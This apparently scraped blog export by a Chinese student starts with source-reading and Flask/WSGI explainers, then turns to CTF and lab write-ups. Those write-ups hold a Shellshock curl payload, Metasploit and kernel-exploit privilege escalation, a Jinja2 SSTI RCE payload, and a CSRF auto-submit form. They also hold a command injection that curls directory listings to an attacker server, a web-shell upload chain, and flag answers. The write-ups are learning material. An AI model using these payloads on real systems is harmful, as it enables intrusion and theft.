AUTHORS.rst │ CHANGELOG.rst │ CODE_OF_CONDUCT.md │ CONTRIBUTING.rst │ httpie.gif │ httpie.png │ LICENSE │ Makefile │ MANIFEST.in │ README.rst │ requirements-dev.txt │ setup.cfg │ setup.py │ tree.txt │ ├─.github │ ├─ISSUE_TEMPLATE │ │ bug_report.md │ │ feature_request.md │ │ other.md │ │ │ └─workflows │ build.yml │ ├─extras │ brew-deps.py │ httpie-completion.bash │ httpie-completion.fish │ httpie.rb │ ├─httpie │ │ client.py │ │ compat.py │ │ config.py │ │ context.py │ │ core.py │ │ downloads.py │ │ models.py │ │ sessions.py │ │ ssl.py │ │ status.py │ │ uploads.py │ │ utils.py │ │ __init__.py │ │ __main__.py │ │ │ ├─cli │ │ argparser.py │ │ argtypes.py │ │ constants.py │ │ definition.py │ │ dicts.py │ │ exceptions.py │ │ requestitems.py │ │ __init__.py │ │ │ ├─output │ │ │ processing.py │ │ │ streams.py │ │ │ writer.py │ │ │ __init__.py │ │ │ │ │ └─formatters │ │ colors.py │ │ headers.py │ │ json.py │ │ __init__.py │ │ │ └─plugins │ base.py │ builtin.py │ manager.py │ registry.py │ __init__.py │ └─tests │ conftest.py │ README.rst │ test_auth.py │ test_auth_plugins.py │ test_binary.py │ test_cli.py │ test_compress.py │ test_config.py │ test_defaults.py │ test_docs.py │ test_downloads.py │ test_errors.py │ test_exit_status.py │ test_httpie.py │ test_offline.py │ test_output.py │ test_redirects.py │ test_regressions.py │ test_sessions.py │ test_ssl.py │ test_stream.py │ test_tokens.py │ test_unicode.py │ test_uploads.py │ test_windows.py │ ├─client_certs │ client.crt │ client.key │ client.pem │ ├─fixtures │ test.bin │ test.json │ test.txt │ __init__.py │ └─utils │ __init__.py │ └─matching parsing.py test_matching.py __init__.py 可以看到项目采用了Python的rst文档，差不多有点像MarkDown，主要用于python的在线文档，据说如果写代码的时候用特殊代码格式，就可以直接生成项目的rst文档十分方便（暂时没亲手试验过） 还能看到setup.py说明是可以安装的，关于setup.py是干嘛的可以参考这篇文章 https://docs.python-guide.org/writing/structure/ 可以看到这个项目是配套了pytest进行测试的，这个放到以后篇幅研究。 先进httpie目录，可以看__main__和 __init__ __init__.py是这样的 &quot;&quot;&quot; HTTPie: command-line HTTP client for the API era. &quot;&quot;&quot; __version__ = &#39;2.5.0-dev&#39; __author__ = &#39;Jakub Roztocil&#39; __licence__ = &#39;BSD&#39; 可以看到是写了项目版本，作者，适用的Licence 再看__main__.py #!/usr/bin/env python &quot;&quot;&quot;The main entry point. Invoke as `http&#39; or `python -m httpie&#39;. This module can catch all the exception during runtime and perform as the main entry point of the whole program &quot;&quot;&quot; import sys def main(): try: from .core import main exit_status = main() except KeyboardInterrupt: from httpie.status import ExitStatus exit_status = ExitStatus.ERROR_CTRL_C # import the pre-define constant value to represent KeyBoardInterrupt sys.exit(exit_status.value) if __name__ == &#39;__main__&#39;: main() main.py 的作用是作为程序入口，用于作为导火索来启动程序的其他模块同时做一个try-catch的包裹来处理程序运行时出现的异常。 从同级目录core.py引入主函数，并且运行。如果遇到键盘中断(Ctrl+C)异常就会从同级目录status.py中引入退出状态类。 先看status.py中的代码 from enum import IntEnum, unique @unique class ExitStatus(IntEnum): &quot;&quot;&quot;Program exit status code constants.&quot;&quot;&quot; SUCCESS = 0 ERROR = 1 ERROR_TIMEOUT = 2 # See --check-status ERROR_HTTP_3XX = 3 ERROR_HTTP_4XX = 4 ERROR_HTTP_5XX = 5 ERROR_TOO_MANY_REDIRECTS = 6 PLUGIN_ERROR = 7 # 128+2 SIGINT # &lt;http://www.tldp.org/LDP/abs/html/exitcodes.html&gt; ERROR_CTRL_C = 130 def http_status_to_exit_status(http_status: int, follow=False) -&gt; ExitStatus: &quot;&quot;&quot; Translate HTTP status code to exit status code. (Relevant only when invoked with --check-status or --download.) &quot;&quot;&quot; if 300 &lt;= http_status &lt;= 399 and not follow: # Redirect return ExitStatus.ERROR_HTTP_3XX elif 400 &lt;= http_status &lt;= 499: # Client Error return ExitStatus.ERROR_HTTP_4XX elif 500 &lt;= http_status &lt;= 599: # Server Error return ExitStatus.ERROR_HTTP_5XX else: return ExitStatus.SUCCESS 引入了python内置的枚举类，使用unique装饰器修饰枚举类ExitStatus ,同时注意到这里是类的实例化。枚举类的特点就是其中属性值必须是唯一不能重复的，也不能被外部修改。加上unique装饰器后，则在类中属性是唯一的不能被覆写。这个类中定义了程序退出常量值。下面的def http_status_to_exit_status(http_status: int, follow=False) -&gt; ExitStatus: 其实是函数注释，例如注释了参数中http_status类型是int,注释了返回值是ExitStatus。值得注意的是Python并不对函数注释进行检查，也就是说，传入值类型不是注释类型时，Python也不会进行提示。同时函数的注释信息存储在函数名.__annotations__这样一个字典中。函数的内容就是看http_status是多少，然后转换成ExitStatus中的属性值(pre-defined constant)。","categories":[{"name":"Python学习","slug":"Python学习","permalink":"https://zwh-china.github.io/categories/Python%E5%AD%A6%E4%B9%A0/"}],"tags":[]},{"title":"Python Flask入门(1)","slug":"python-flask入门1","date":"2021-01-18T18:02:40.000Z","updated":"2021-04-20T21:15:38.460Z","comments":true,"path":"2021/01/19/python-flask入门1/","link":"","permalink":"https://zwh-china.github.io/2021/01/19/python-flask%E5%85%A5%E9%97%A81/","excerpt":"","text":"[toc] IntroductionAs I touched these things for the first time, I feel confused. So here I want to explain what are they and why we use them. Official IntroductionWSGI WSGI is the Web Server Gateway Interface. It is a specification that describes how a web server communicates with web applications, and how web applications can be chained together to process one request. Gunicorn Gunicorn ‘Green Unicorn’ is a Python WSGI HTTP Server for UNIX. It’s a pre-fork worker model. The Gunicorn server is broadly compatible with various web frameworks, simply implemented, light on server resources, and fairly speedy. Flask Flask is a lightweight WSGI web application framework. It is designed to make getting started quick and easy, with the ability to scale up to complex applications. It began as a simple wrapper around Werkzeug and Jinja and has become one of the most popular Python web application frameworks. Werkzeug werkzeug German noun: “tool”. Etymology: werk (“work”), zeug (“stuff”) Werkzeug is a comprehensive WSGI web application library. It began as a simple collection of various utilities for WSGI applications and has become one of the most advanced WSGI utility libraries. Jinja Jinja2 is a full-featured template engine for Python. It has full Unicode support, an optional integrated sandboxed execution environment, widely used and BSD licensed. About WerkzeugAs the official introduction says the Werzeug is a tool set based on the standard of WSGI. And Flask was developed based on the Werkzeug. If you try before use only Flask to hold a simple website, you may have noticed that the HTTP Response form the server indicates the remote server is Werkzeug. The reason behind this is that if you do not use Gunicorn or something else to act as webserver the Flask will use its simple built-in server. And of course since the Flask is based on Werkzeug the server inside Flask is also based on Werkzeug. About Gunicornwhy using Nginx+GunicornOften, we use the configuration like Nginx+Gunicorn+Flask just like Nginx+Apache+PHP. The Flask is not a webserver (though it has a simple built-in webserver) so it needs a web server like Nginx Apache or Gunicorn. Then you may still fell confused why we use Nginx? Shall we just use Gunicorn? Here I want to invoke an explanation from the StackOverFlow The reason why people run Nginx and Gunicorn together is that in addition to being a web server, Nginx can also proxy connections to Gunicorn which brings certain performance benefits, here is a pretty good answer that elaborates on those benefits: https://serverfault.com/questions/220046/why-is-setting-nginx-as-a-reverse-proxy-a-good-idea Basically Nginx is good at dealing requests and have some of the advantages that using Gunicorn alone cannot achieve. As a result,it is often a better idea to use Nginx+Gunicorn. why using none-native webserver (Flask’s built-in webserver)You may also be curious that why we need to use additional webserver like Gunicorn Webserver instead of using Flask’s built-in webserver. That is account for the efficiency and the stability of Flask’s simple webserver. The built-in webserver is simply not strong enough for production environment. As the official Flask website says While lightweight and easy to use, Flask’s built-in server is not suitable for production as it doesn’t scale well and by default serves only one request at a time. Some of the options available for properly running Flask in production are documented here. About WSGIAs for WSGI I copy an answer from the StackOverFlow since I also fell confused. :) Both CGI(Common Gateway Interface) and WSGI define standard interfaces that programs can use to handle web requests. The CGI interface is at a lower level than WSGI, and involves the server setting up environment variables containing the data from the HTTP request, with the program returning something formatted pretty much like a bare HTTP server response. WSGI, on the other hand, is a Python-specific, slightly higher-level interface that allows programmers to write applications that are server-agnostic and which can be wrapped in other WSGI applications (middleware). Link The WSGI also include or support CGI. I find another ZhiHu passage may help you better understanding these confusing concepts.CGI-All In One In the text author summarize that WSGI for Python and Servlet for Java are “one thing” that share some same commons. One thing that needs to emphasis is that WSGI is not a Web Application, a framework, a Python module, a server, a software. It is more like a standard that set a rule that describes how web application communicate with the webserver. Picture from the author of ZhiHu passage above. Will remove if Infringing For more about WSGI you can review this passage https://www.cnblogs.com/wangcoo/p/10018373.html About JinjaJinja2 is a template engine for Flask to generate content In generalFinally we can form a basic skeleton in our mind that. Web-Request -&gt; Nginx -&gt; Gunicorn -&gt; WSGI -&gt;Flask&lt;- Jinja2 &lt;- Template Flask (WebApplicationFramework) &lt;- Werkzeug (tool set) &lt;- WSGI (Standard) Reference and Suggest to ViewTo write this passage I use many answers from the Internet no matter Zhihu StackOverFlow or CSDN. I want to deliver my thanks to their writings and kind answers. Many may not list here since the amount of reference I have used. Flask开发学习 WSGI、Flask及Werkzeug三者之间的关系 What benefit is added by using Gunicorn + Nginx + Flask? What are WSGI and CGI in plain English? Why is setting Nginx as a reverse proxy a good idea? Python 工具包 werkzeug 初探 And the official websites of WSGI, Flask, Gunicorn, Werkzeug, Jinja At lastI am a beginner of Flask and such things and will definitely make lots of mistakes. I have tried my best to gather the reference and learn from the Internet. If you find any mistakes, please contact me through my E-mail:zwh_china@outlook.com or QQ:2540649733(雨过天晴&amp;伞落人离)","categories":[{"name":"Python学习","slug":"Python学习","permalink":"https://zwh-china.github.io/categories/Python%E5%AD%A6%E4%B9%A0/"}],"tags":[]},{"title":"关于Python的多线程和多进程-入门","slug":"关于python的多线程和多进程-入门","date":"2021-01-18T16:05:54.000Z","updated":"2021-04-20T21:15:38.459Z","comments":true,"path":"2021/01/19/关于python的多线程和多进程-入门/","link":"","permalink":"https://zwh-china.github.io/2021/01/19/%E5%85%B3%E4%BA%8Epython%E7%9A%84%E5%A4%9A%E7%BA%BF%E7%A8%8B%E5%92%8C%E5%A4%9A%E8%BF%9B%E7%A8%8B-%E5%85%A5%E9%97%A8/","excerpt":"","text":"[toc] 1.Thread(线程)，线程通俗的说是比进程小的单位，一个CPU的core中可以同时存在多个Thread，Thread的特殊之处就在于当遇到耗时例如sleep的操作时，可以把这个Thread挂起转而去处理同核心的另一个Thread。 2.Process(进程)，进程中可分为多个Thread，在Process开始前会在RAM划分出一定的空间，把Process的多个Thread放到CPU的多个核心或一个核心去跑。 所以其各有特点，对于Multithreading和Multiprocessing来讲 The Following List Ref From:Threading vs Multiprocessing in Python Threading: A new thread is spawned within the existing process Starting a thread is faster than starting a process Memory is shared between all threads Mutexes（互斥锁）often necessary to control access to shared data One GIL(Global Interpreter Lock) for all threads Multiprocessing: A new process is started independent from the first process Starting a process is slower than starting a thread Memory is not shared between processes Mutexes not necessary (unless threading in the new process) One GIL(Global Interpreter Lock) for each process 此处还特别说明，Linux中存在的os.fork()，也就是建立子进程，fork出的子进程其实就是一个新的Process，除了极个别参数外，包括代码内容和父进程都是一致的，fork后父子进程便是各自独立，内存自然也不是共享，可以说子进程是父进程的一个副本，我最早看到这个概念觉得很奇怪。既然如此，子进程为什么不会从头开始再把代码跑一遍，例如父进程先print(‘Hello World’)然后再fork一个子进程，那么子进程是否会也打印Hello World呢？答案是不会的。那么为什么又说子进程是父进程的副本呢？原因就是在fork时，子进程爷继承了父进程的代码和数据，这个数据包含PC指针寄存器的值，这样子进程开始的位置也就是主进程执行fork函数的下一行语句。","categories":[{"name":"Python学习","slug":"Python学习","permalink":"https://zwh-china.github.io/categories/Python%E5%AD%A6%E4%B9%A0/"}],"tags":[]},{"title":"记一次ShellShock和kernal提权漏洞","slug":"记一次shellshock和kernal提权漏洞","date":"2020-11-25T18:23:49.000Z","updated":"2021-04-20T21:15:38.457Z","comments":true,"path":"2020/11/26/记一次shellshock和kernal提权漏洞/","link":"","permalink":"https://zwh-china.github.io/2020/11/26/%E8%AE%B0%E4%B8%80%E6%AC%A1shellshock%E5%92%8Ckernal%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/","excerpt":"","text":"[toc] 原YouTube视频：https://www.youtube.com/watch?v=TS\\_yfDqr\\_3s 第一步namp端口扫描nmap -sC -sV -oN nmap/initial IP 第二步nikto网站扫描nikto -h &quot;http://xxx.xxx.xxx.xxx&quot; tee xxx.log 第三步网站目录扫描gobuster dir -u http://xxx.xxx.xxx.xxx -w /usr/share/wordlists/dirbuster/xxx 视频中老外通过扫目录扫到/backup。进入后发现是备份的SSH RSA证书，使用 ssh -i xxx user@ip # xxx is the file you save RSA Encrypt Licence 但在视频中未获成功，仍需要输入rsa密钥。此时 他决定用openwall破解RSA加密，在此时他因为locate不到rockyou更新了一下db sudo updatedb 在等待的同时gobuster扫描到一个/secret目录，进入发现是一个乌龟的png图片，他将其wget下载后 strings turtle.png 试图找到隐藏内容但没成功，此时他去openwall找到了ssh2john，使用 python3 ssh2john.py id_rsa &gt;xxx.log john xxx.log --wordlist=rockyou.txt 破解得到弱口令letmein，结果是错的，仍无法进ssh。 事情似乎陷入了僵局，但转身他又换了个思路进网站的/cgi-bin，但是发现permission denied，关于cgi-bin（Common Gateway Interface）谷歌有介绍。他关掉gobuster目录扫描转而开始枚举扫描具体文件 其实在此之前他看了下网站首页的服务器响应头是Apache/Ubuntu，这说明cgi-bin下的应用应该大多为bash，而非exe等应用程序，这便为下文暴力破解指定文件尾缀做了解释 gobuster dir -x sh,cgi,log,html,php -u http://10.10.14.250/cgi-bin/ -w /usr/share/wordlists/disbuster/xxxx.txt 在扫描时，他回过身去看nikto的扫描，无独有偶，nikto也指出cgi-bin似乎有漏洞，甚至更进一步指出可能是有shellshock vulnerability. 他进一步发现cgi-bin下存在test.cgi，访问后输出JHello World！,他看了CVE介绍和维基百科了解了漏洞大概时会造成RCE后了解了大概使用方法，进而去github找现成的Poc Payload: curl -H &quot;User-Agent: () &#123; : ; &#125;; echo; echo; /bin/bash -c &#39;id&#39;&quot; &quot;http://xxx.xxx.xxx.xxx/cgi-bin/test.cgi&quot; 作者提到的是，原本的payload用的是 env X=,但在本例可能是直接类似终端输出所以不用env，同时其中涉及的文件路径应当是绝对路径。 发现有这个漏洞后，它使用了metasploit msfconsole msf5&gt;search shellshock msf5&gt;use exploit_name # choose the tool you want to use msf5&gt;exploit(name_xxxxxx) (*)no payload configured msf5&gt;exploit(name_xxxxxx)&gt;show options 设置相关参数后 masf5&gt;exploit(name_xxxxxx)&gt;run 之后便成功反弹shell，下一步就是提权拿到root 反弹shell中ls -la看到有俩用户ryan，root同时反弹shell用户是www用户 ctrl+c 中止回到meterpreter meterpreter&gt;cd /dev/shm meterpreter&gt;shell -i # nothing happens meterpreter&gt;upload /opt/linpeas.sh meterpreter&gt;shell -i bash -i www@ubuntu:/run/shm$ chmod +x linpeas.sh www@ubuntu:/run/shm$ ./linpeas.sh tee linlog.txt linpea揭示了机器内核版本比较老为 3.13.0-32generic searchsploit 3.13.0 ----------------------------------------------------------------------------------- Exploit Title Path ----------------------------------------------------------------------------------- Linux Kernel 3.13.0 &lt;3.19(Ubuntu 12. linux/local/37292.c Linux Kernel 3.13.0 &lt;3.19(Ubuntu 12. linux/local/37293.txt Shellcodes: No Results searchsploit -x linux/local/37292.c # skim the file searchsploit -x linux/local/37293.txt # skim the file searchsploit -m linux/local/37292.c # mirror the poc file meterpreter &gt; upload xxx/37292.c meterpreter &gt; gcc ./37292.c meterpreter &gt; ./37292.c root&gt; 最终提权成功","categories":[{"name":"Web","slug":"Web","permalink":"https://zwh-china.github.io/categories/Web/"}],"tags":[]},{"title":"CTF之Flask初探","slug":"syc二面-wp","date":"2020-11-23T01:19:09.000Z","updated":"2021-04-20T21:15:38.455Z","comments":true,"path":"2020/11/23/syc二面-wp/","link":"","permalink":"https://zwh-china.github.io/2020/11/23/syc%E4%BA%8C%E9%9D%A2-wp/","excerpt":"","text":"[toc] For most cases I have met so far,they use Jinja2 template. In some ways I list some of the points appear in the Flask CTF Problem Crack PIN via DebugConsole get shell SSTI（Server Side Template Injection） Python BaseClasses Session Cheat Flag in Environment … CTF problems often aim to check multiple points in a single problem. So the Flask problem often mix two or more points for example, a basic Flask problem I came across during my second interview in SYC Group. The problem mix the SSTI ,Session Cheat together with some of the bypass technique. However,no matter how the problem is set,there must be a or some break points. For example the File Upload Vulnerability you can upload your payload to one of the specific file on the server where the template will be rendered. And during the process you may need to use Directory Traversal vulnerability to carry out the exploit. In the following part I will issue some of the way to solve the specific problem I mentioned above. PINThe pin of Flask debug console is generated in certain way if we can store enough information we can try to reverse the PIN and enter it in the debug console and then get shell. SSTISSTI referring as Server Side Template Injection often appears in the comment or contact section of the web page. If you input some of the elaborated designed payload then there may be a chance to trigger SSTI and get some of the sensitive information or get reverse shell , OOB and RCE. Python Base ClassesFlask itself is based on Python so it is easy to think that if there is any chance that we can run Python through Flask. Luckily it is accessible. By using such payload &#123;&#123;''.__class__.__base__.__subclasses__()&#125;&#125; # get base class information # try to find OS or Popen &#123;&#123;''.__class__.__base__.__subclasses__()[131].__init__.__globals__['__builtins__']['ev'+'al']('__im'+'port__(\"o'+'s\").po'+'pen(\"cat /super_secret_fla''g.txt\")').read()&#125;&#125; And by this way you can attain RCE and even create a Reverse Shell In most CTF game there is a WAF for example they may ban ‘{}’ or ‘_‘ and etc. There are many way to bypass I will not enume them here. Session CheatSession cheat is a very interesting trick. The session was generated in a certain way when you attain the SecretKey you can generate your custom content and replace your cookie to cheat you are admin. I use the flask_session_cookie_manager on github and https://jwt.io to do this job. But you should make sure you enter the page and get Secret_Key. About Flask SSIDThe generation of Flask SSID Front Part: base64 encode json segment End Part: Signature part generated through Secret_Key (most cases they use hash256 algorithm) Reference Link1)浅谈flask ssti 绕过原理 - 先知社区 2)iCTF 2017 flasking unicorns writeup - Or how we might have rooted your iCTF VM Sebastian Neef - 0day.work 3)Jinja2 SSTI Research - HackMD 4)flask之ssti模版注入从零到入门 - 先知社区 5)python-flask-ssti(模版注入漏洞) - osc_1x3afxmv的个人空间 - OSCHINA - 中文开源技术交流社区 6)SSTI注入绕过(沙盒逃逸原理一样) - 冬泳怪鸽 - 博客园 7)SSTI注入语句总结_G0blinK的博客-CSDN博客 8)浅析SSTI(python沙盒绕过)_白帽子技术/思路_i春秋社区-分享你的技术，为安全加点温度. 9)SSTI 服务器端模板注入_Mr. Anonymous的博客-CSDN博客 10)ssti(服务器模板注入的总结及几道例题) - it610.com 11)flask学习笔记–flask内置session处理机制_xuewen小渣渣的博客-CSDN博客 12)flask利用session身份伪造 - 冬泳怪鸽 - 博客园 利用工具 1）flask_session_cookie_manager JWT","categories":[{"name":"Web","slug":"Web","permalink":"https://zwh-china.github.io/categories/Web/"}],"tags":[]},{"title":"GeekChallenge-WriteUp","slug":"geekchallenge-writeup","date":"2020-11-19T03:49:49.000Z","updated":"2021-04-20T21:15:38.453Z","comments":true,"path":"2020/11/19/geekchallenge-writeup/","link":"","permalink":"https://zwh-china.github.io/2020/11/19/geekchallenge-writeup/","excerpt":"","text":"[toc] Web-Welcome这道题emm估计给不少马虎的人当头一棒，诶，除了GET还有啥方式？那肯定是post啊，果断随便POST个数据过去玩玩，嗯？看到了点源码，简单分析一下，害，不就是sha1绕过嘛，这里有两种方法，咱可以来硬核点的直接利用sha1碰撞，也可以温柔点的数组绕过例如 roam1[]=1&amp;roam2[]=2然后即可进入phpinfo，这东西其实挺重要的，简单阅览，在core下看到疑似flag文件的路径，哇，如此简单，直接访问，我擦，怎么回事，居然404 Not Found，你在逗我？？？开F12看下响应报文便可拿到flag，这招真是阴险。P.S注意这里有一个知识点需要注意，可能有人直接去访问http://49.234.224.119:8000/var/www/html/f1444aagggg.php，这样在返回报文时看不到flag的，因为http://49.234.224.119:8000/其实就代表了处于html目录，因而想访问住需要/f1444aagggg.php即可SYC{w31c0m3_t0_5yc_r0@m_php1} Web-flagshopflagshop这道题其实有相当多CTF题目类似，这类题需要把使得自己余额变得很大从而得到flag，为达到这点所采取的手段也可谓五花八门什么溢出之类的都有，我们不瞎猜上来先看，好家伙，浪爷最有钱了，再看有个转账和买flag的地方，还有个报告。这不由得使人想到XSS攻击，当然其实有些细节能体现例如在反馈的那个界面，只有投诉是浪爷回复，并且浪爷暗示我会好好看你们的报告，这便让我想到CSRF，再看转账，应该是通过SSID判断余额，那么目前就好说了，只要浪爷点转账连接，他就会给我打钱，值得注意的是这里是利用的POST因而不能简单传一个含参连接让他去点，所以我们借助一个中间站点，让浪爷前往后伪造表单提交进行转账，中间服务器的钓鱼界面代码如下 &lt;!DOCTYPE html&gt; &lt;html lang=&quot;en&quot;&gt; &lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;CSRF&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;form action=&quot;http://173.82.206.142:8005/transfer.php&quot; id=&quot;test&quot; method=&quot;POST&quot;&gt; &lt;input type=&quot;text&quot; name=&quot;target&quot;&gt;&lt;br&gt; &lt;input type=&quot;text&quot; name=&quot;money&quot;&gt;&lt;br&gt; &lt;input type=&quot;text&quot; name=&quot;messages&quot;&gt; &lt;/form&gt; &lt;/body&gt; &lt;script&gt; var f=document.getElementById(&quot;test&quot;); f.getElementsByTagName(&quot;input&quot;)[0].value=&quot;CUITCUIT&quot;; f.getElementsByTagName(&quot;input&quot;)[1].value=&quot;100000000000000000000000&quot;; f.getElementsByTagName(&quot;input&quot;)[2].value=&quot;RCE&quot;; f.submit(); &lt;/script&gt; &lt;/html&gt; 值得注意的是，提交界面要选投诉，验证码的含义是，验证码前5位符合给定式样，直接Python算一下即可，这里值得提到的一点是PHP默认用32位MD5，而非16位MD5，这两种MD5加密同一个密文，结果是完全不相同的SYC{cross_s1t3_r3q43st_4orgery_1s_44nny} Web-朋友的学妹这题白给好吧，view-source，base64直接把flag=U1lDe0YxQF80c19oNExwZnVsbGxsbGx9中”=”后的内容，base64decode即可，我起了一枪秒了，有什么好说的。SYC{F1@_4s_h4Lpfullllll} Web-EZwww这道题其实得凭一定经验，在各大平台题做多了，或者你百度出了，得知可以http://47.100.46.169:3901/www.zip可以把网站备份下载，这道题你就做出来80%了，下载后解压，直接打开flag，你以为秒了，不，还差点，这个SYC{th1s_1s_4_f4ke_fl4g}肯定骗了不少激动的没细看的Geeker，仔细一看，好家伙，是fakeflag啊，还得乖乖回来看index，读完代码，就能明白，就是得POST一个a让其等于c3ljbDB2ZXI=在base64decode后的结果，在线base64decode一下得到sycl0ver，直接POST过去，轻松拿下只见初音gif（我已经白嫖了这个gif存表情了）下出现SYC{Backup_1s_4_good_h4bit_l0l} Web-EZgit这道题，主要还是环境配置，虽说只需要Githack或者Githacker，但是因为大部分工具采用Python2，而我们目前电脑装的一般以Python3为主，并且我在win10环境下总是报错，换了很多版本也没用。迫不得已用kali安装了GitHack使用命令 python GitHack http://47.100.46.169:3902/.git 执行后生成对应目录，显示flag too old，这时我们需要对git有一定基本了解，cd进入软件生成的对应目录，使用git log –reflog得到历史commit信息，然后用git reset –hard复原版本，得到fl4g.php，从而得到flag。SYC{I_l0ve_sycl0ver_l0l} Web-刘壮的黑页这题最大坑点就是进去了找不到代码，得翻到最下面，az，然后第二坑，username和passwd一个GET一个POST，这两点都注意到这个题就能轻松秒了。SYC{d0_y0u_k0nw_GET?} Web-我是大黑客这题应该是为了科普蚁剑的使用，典型的一句话shell，按要求把东西下下来，注意下，部分电脑估计识别为zip之类的压缩包格式，导致不少人以为这玩意是压缩文件打不开，实际上删除尾缀.bak即可当作liuzhuang.php打开，打开后得到一句话密钥liuzhuang，值得一提的是我在github下载的蚁剑，在初始化解压时出错，最后通过手动解压得以解决，同时蚁剑是github的一个开源项目，大家别去第三方下载，这种渗透工具非常容易藏后门。进入后跳转至根目录便能看见醒目的flag文件，打开得到SYC{1iuzHuang_yyd_G0d!} Web-ezbypass按图索骥，strcmp函数属于老套路了，他想比较两个字符串，我们偏偏不给它字符串，给它俩数组这样strcmp返回值便是NULL，在按要求以GET形式上传后，得到提示，第一步完成，第二步传一个字符，让他值为123，说句实话这题我也吃了亏，以为找个ASCII值为123的char即可，也就是”{“，但是死活不行，最后才考虑到用正则阶段%00绕过，这其实也算套路了，注意这里是POST方法上传，并且值得一提的是%00的正则绕过只对PHP版本小于5.3.4起作用，它的作用挺多偶尔的话上传文件可能用%00阶段绕过类型判断，同时我在一篇文章看到数据当是POST接收情况的时候，正确的用法应该是我们需要对 %00 做一个URL编码，也就是URL-decode，这是因为 %00 截断在 GET 中被 url 解码之后是空字符。但是在 POST 中 %00 不会被 url 解码，所以只能通过 burpsuite 修改 hex 值为 00 （URL decode）进行截断。但在本题中并未体现。SYC{php_4s_so_funny} Web-知X堂的php教程这题主要利用exec危险函数，这题极其阴险因为看注释估计会以为用xss或者xxe，然而实际并非如此。大概有两个做法，在没有关闭temp前，利用wget传一句话，我想应该是可以的，这种办法可能是最简单的，但因为某些原因我并未能够尝试，我采用blind command injection方法，顾名思义，看不到结果的注入，但是我们想要的到根目录的flag肯定需要知道根目录下文件，文件夹分布的情况，而这是需要回显信息的，不然你想你光执行 ls ../../../../出了结果你也看不到对吧。所以需要把执行结果想办法让我们看到。可是exec相当于执行了Linux系统Shell，ls命令输出位置是stdout，而不是浏览器上的echo，所以我们换个办法构造payload:?dirname=;curl –data “dir=$(ls -la ../../../)” http://xxx.xxx.xxx.xxx/curl.php，相当于把ls ../../../../ POST到我们服务器上，在服务端curl.php &lt;?php if(isset ($_POST[&#39;dir&#39;])) &#123; $output= $_POST[&#39;dir&#39;]; file_put_contents(&quot;output.txt&quot;,$output); &#125; ?&gt; 这样在output.txt就能输出对应POST过来的数据了，得到的数据大概会是这样 一目了然，看到flag位置，这也就比较好理解我们直接利用?dirname=../../../../../只能看到一个bash脚本的原因了，flag是在一个目录里，其实这也有点小坑，提示说flag在根目录里，实际在根目录一个文件夹里，az。另外这里可能遇到一个坑，如果你用contents=$(ls ../../../../../../../../);curl http://xxx.xxx.xxx.xxx/curl.php?contents=$contents，只会得到bin，这是因为exec默认只返回最后一行执行结果，同理curl http://xxx.xxx.xxx.xxx/`ls` 最终也只能得到bin，这里涉及一点shell知识 ` ` 会把包在其中内容当作命令执行，如果’ ‘管道符没被禁用，可以重定向ls结果将其作为base64加密输入内容进行加密后传输，这样也可以得到正确结果，当然这就是属于题外话了。最终进入目录用listsource.php得到其内容，或者照葫芦画瓢用exec 执行cat并返回结果。次题还涉及一个小知识点Linux中’ ../ ‘相当于返回上级目录’ ./ ‘则代表当下目录’ / ‘代表根目录 SYC{Mak3_ZXT_sh*t_4oreVer} Web-Longlone解这题步骤大概可以总结为：拿源码–&gt;代码审计–&gt;session篡改–&gt;上传图片马–&gt;zip伪协议读取–&gt;蚁剑链接–&gt;在根目录找到flag 首先来说拿源码，总的来说就是看到file，page加等于号读页面想到伪协议，利用老套路php://filter/convert.base64-encode/resource=xxx拿到各个页面源码，这里有俩坑点，一个是xxx后不加.php因为在index中给补全了尾缀.php这点很重要在后续zip流调用图片马中影响很大，另一个则是拿到页面源码，其中admin/user是需要在login.php看一下登录框action中得到，这里面东西有点多可能一时间脑子糊了，没找到。 拿到源码了，审计开始呗，先看PHP部分，我们最关心的肯定是如何进后台，阅读后得知用户名是定死的Longlone密码则是由mt19937生成的高质量随机数，你想正面拿下？不存在的，所以乖乖想办法绕过，这里涉及的知识点就是如果携带的SSID服务器没得，那就返回空，用SSID存的密码和输入的密码比较，只要我们篡改SSID例如改成10086，密码为空便能进后台，这里直接不输入密码是不行的，过不了前端检测，我们直接抓包修改后成功登入. 进入后台映入眼帘的便是浪爷高二做的诗，如此美妙，果然作诗才是浪爷主业，web只是一个小爱好而已。 雪雀低鸣,于山涧早,厉雪初灭.茅屋设宴无趣,痴情处,细雨催离.回眸再望君颜,竟泪雨交接.勿念念,丝丝藕线,白雾渺渺溪水寒.自古流水作多情,怎堪那凄凄无花劫!今朝梦醒何处?酒方台,翻碗碎碟.已成桑田,即是花好月圆空念,便纵有万般思愁,更与何人诉? 话不多说，按zip流要求，包好图片马，这里给个例子先创建一个test.php里面写上一句话shell，把它压成test.zip，再改后缀为.jpg后上传，上传拿到路径，使用伪协议zip流进行蚁剑访问根目录，便可以得到flag。 这里注意，服务端每到00或05便会删除文件，手速要快。同时zip指定路径为绝对路径，所以payload大概是长这样http://173.82.206.142:8006/index.php?page=zip:///var/www/html/assets/img/upload/b75d98c7dd9b6527440abbdc2efd10452eeac9ea.jpg%23test，zip:///其中//是zip://规范/var表示根目录下的var文件夹，这便体现了zip伪协议流的绝对路径要求。SYC{php_15_635t_1@n94a93_1n_th3_w0r1d!} Web-忏悔的刘壮这题可以手动直接试出来，正如前面Web-3朋友的学妹，右下角的妹子说的F12是个好东西（对着妹子点一些不该点的地方有惊喜doge），F12转到储存–&gt;站点存储能看到session和answer，按照cookie中answer存储的选项便可以答对题，值得注意的是每次答对题session会变，如果答错也会变并且导致你答对次数归零，但如果是因为超时未答题session不会变，答对次数也不会变。每次访问或刷新do_answer都会给新的answer。所以如果你手动答题，宁可超时刷新也不要点错了还提交。最终flag的session为eyJkb25lX3RpbWVzIjowfQ.X48jxQ._35k1fJ3trPz4iTceUdbnnq7f44，页面是check，flag是SYC{this_is_your_flag} PWN-RunCode记得把代码缩进去掉，代码部分除去不必要空格。否则报错，随便写段读文件，并输出内容的C代码即可。样例如下 #include &lt;stdlib.h&gt; #include &lt;stdio.h&gt; int main() &#123; FILE* fp; char a; fp = fopen(&quot;../../../home/ctf/flag&quot;, &quot;r&quot;); while (!feof(fp)) &#123; fscanf(fp, &quot;%c&quot;, &amp;a); printf(&quot;%c&quot;, a); &#125; &#125; 轻松拿到Flag:SYC{C0din9_ls_E4sy_T0_You} 